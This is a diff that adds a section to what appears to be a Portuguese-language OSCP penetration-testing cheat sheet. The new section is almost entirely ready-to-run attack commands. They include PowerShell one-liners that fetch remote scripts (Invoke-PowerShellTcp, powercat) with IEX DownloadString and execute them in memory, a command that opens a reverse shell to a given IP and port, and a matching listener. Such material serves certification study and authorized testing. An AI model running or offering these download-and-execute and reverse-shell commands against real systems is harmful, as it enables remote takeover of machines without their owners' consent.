@@ -1474,6 +1474,25 @@ powercat -l -p 8000 -ep -rep
 ```
 powercat -c 172.31.8.201 -p 8000
 ```
+## INVOKE-POWERSHELLTCP 
+##### INVOKE-POWERSHELLTCP - DOWNLOAD
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp.ps1")
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp.ps1 -outfile Invoke-PowerShellTcp.ps1
+Import-Module .\Invoke-PowerShellTcp.ps1
+```
+##### INVOKE-POWERSHELLTCP - SHELL REVERSO
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 172.31.13.86 -Port 666
+```
+AGUARDAR A CONEXÃO COM POWERCAT:
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
+powercat -l -p 666 -v
+```
+
 
 
 
